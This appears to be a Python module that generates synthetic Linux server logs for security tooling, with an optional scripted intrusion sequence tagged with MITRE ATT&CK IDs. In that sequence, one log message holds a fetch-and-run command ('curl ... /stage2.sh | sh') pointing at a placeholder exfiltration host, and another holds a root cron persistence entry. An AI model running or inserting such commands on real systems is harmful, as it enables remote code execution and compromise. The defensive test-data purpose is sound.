"""Synthetic but realistic security telemetry for a single Linux web server.

IP addresses come from the RFC 5737 documentation ranges, so nothing here
points at a real system.
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone

from .records import RawEvent

HOST = "web-prod-01"
ATTACKER_IP = "203.0.113.45"
EXFIL_IP = "198.51.100.23"
USERS = ["alice", "bob", "carol", "svc-backup", "deploy"]
INTERNAL = ["10.0.4.12", "10.0.4.27", "10.0.7.3", "10.0.9.41", "10.0.2.8"]
CLIENTS = ["192.0.2.10", "192.0.2.77", "192.0.2.140", "192.0.2.201"]
PATHS = ["/api/orders", "/api/cart", "/login", "/static/app.js", "/api/products", "/health"]
STORY_STEP_SECONDS = 4


def _iso(ts: datetime) -> str:
    return ts.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def _normal(rng: random.Random, ts: datetime, host: str) -> RawEvent:
    roll = rng.random()
    t = _iso(ts)
    if roll < 0.40:
        path, status, ip = rng.choice(PATHS), rng.choice([200, 200, 200, 304, 404]), rng.choice(CLIENTS)
        return RawEvent(ts=t, host=host, source="nginx", type="http_request", severity="info",
                        actor=ip, msg=f"GET {path} {status}",
                        attrs={"client_ip": ip, "path": path, "status": str(status)})
    if roll < 0.55:
        user, ip = rng.choice(USERS[:4]), rng.choice(INTERNAL)
        port = rng.randint(40000, 65000)
        return RawEvent(ts=t, host=host, source="sshd", type="login_success", severity="info",
                        actor=user, msg=f"Accepted publickey for {user} from {ip} port {port} ssh2",
                        attrs={"src_ip": ip, "method": "publickey"})
    if roll < 0.62:
        user, ip = rng.choice(USERS[:4]), rng.choice(INTERNAL)
        port = rng.randint(40000, 65000)
        return RawEvent(ts=t, host=host, source="sshd", type="login_failure", severity="low",
                        actor=user, msg=f"Failed password for {user} from {ip} port {port} ssh2",
                        attrs={"src_ip": ip, "method": "password"})
    if roll < 0.72:
        job = rng.choice(["logrotate", "backup-db", "certbot-renew", "metrics-push"])
        actor = "svc-backup" if job == "backup-db" else "root"
        return RawEvent(ts=t, host=host, source="cron", type="job_run", severity="info",
                        actor=actor, msg=f"CRON job {job} completed", attrs={"job": job, "exit_code": "0"})
    if roll < 0.82:
        dst = rng.choice(INTERNAL)
        return RawEvent(ts=t, host=host, source="firewall", type="connection_allowed", severity="info",
                        actor="nftables", msg=f"ALLOW tcp {host} -> {dst}:5432",
                        attrs={"dst_ip": dst, "dst_port": "5432", "proto": "tcp"})
    if roll < 0.92:
        user = rng.choice(USERS[:3])
        path = rng.choice(["/etc/nginx/nginx.conf", "/srv/app/config.yml", "/var/www/index.html"])
        return RawEvent(ts=t, host=host, source="auditd", type="file_access", severity="info",
                        actor=user, msg=f"read {path}", attrs={"path": path, "syscall": "openat"})
    svc = rng.choice(["nginx", "app-worker", "node-exporter"])
    return RawEvent(ts=t, host=host, source="systemd", type="service_restart", severity="low",
                    actor="systemd", msg=f"Restarted {svc}.service", attrs={"unit": f"{svc}.service"})


def intrusion_story(start: datetime, host: str = HOST) -> list[RawEvent]:
    """A compact intrusion kill chain that an attacker would later want to erase."""
    a, x = ATTACKER_IP, EXFIL_IP
    steps: list[tuple[str, str, str, str, str, dict[str, str]]] = [
        ("firewall", "port_scan", "medium", a, f"SYN scan from {a} across 1024 ports",
         {"src_ip": a, "mitre": "T1046"}),
    ]
    for i in range(6):
        steps.append(("sshd", "login_failure", "high", "root",
                      f"Failed password for root from {a} port {51000 + i} ssh2",
                      {"src_ip": a, "method": "password", "mitre": "T1110"}))
    steps += [
        ("sshd", "login_success", "critical", "deploy",
         f"Accepted password for deploy from {a} port 51022 ssh2",
         {"src_ip": a, "method": "password", "mitre": "T1078"}),
        ("sudo", "privilege_escalation", "critical", "deploy",
         "deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash",
         {"src_ip": a, "target_user": "root", "mitre": "T1548.003"}),
        ("auditd", "persistence", "high", "root", "crontab modified for root: @reboot /tmp/.x/agent",
         {"src_ip": a, "path": "/var/spool/cron/crontabs/root", "mitre": "T1053.003"}),
        ("edr", "suspicious_process", "high", "root", f"curl -s http://{x}/stage2.sh | sh",
         {"src_ip": a, "dst_ip": x, "mitre": "T1059.004"}),
        ("firewall", "data_exfiltration", "critical", "root", f"Outbound transfer 48.2 MB to {x}:443",
         {"src_ip": a, "dst_ip": x, "bytes": "50541363", "mitre": "T1041"}),
    ]
    out = []
    for i, (source, etype, sev, actor, msg, attrs) in enumerate(steps):
        ts = start + timedelta(seconds=STORY_STEP_SECONDS * i)
        out.append(RawEvent(ts=_iso(ts), host=host, source=source, type=etype, severity=sev,
                            actor=actor, msg=msg, attrs={**attrs, "story": "intrusion"}))
    return out


INTRUSION_LENGTH = len(intrusion_story(datetime(2000, 1, 1, tzinfo=timezone.utc)))


def generate_traffic(count: int, seed: int | None = None, include_intrusion: bool = False,
                     host: str = HOST, end: datetime | None = None) -> list[RawEvent]:
    """Return `count` normal events (plus the intrusion story if requested), oldest first."""
    if count < 0:
        raise ValueError("count must be >= 0")
    rng = random.Random(seed)
    end = end or datetime.now(timezone.utc)
    gaps = [rng.uniform(1.0, 15.0) for _ in range(count)]
    story_span = STORY_STEP_SECONDS * INTRUSION_LENGTH if include_intrusion else 0
    ts = end - timedelta(seconds=sum(gaps) + story_span)
    insert_at = int(count * 0.6) if include_intrusion else -1
    events: list[RawEvent] = []
    for i in range(count):
        if i == insert_at:
            events.extend(intrusion_story(ts, host))
            ts += timedelta(seconds=story_span)
        ts += timedelta(seconds=gaps[i])
        events.append(_normal(rng, ts, host))
    if include_intrusion and count == 0:
        events.extend(intrusion_story(ts, host))
    return events
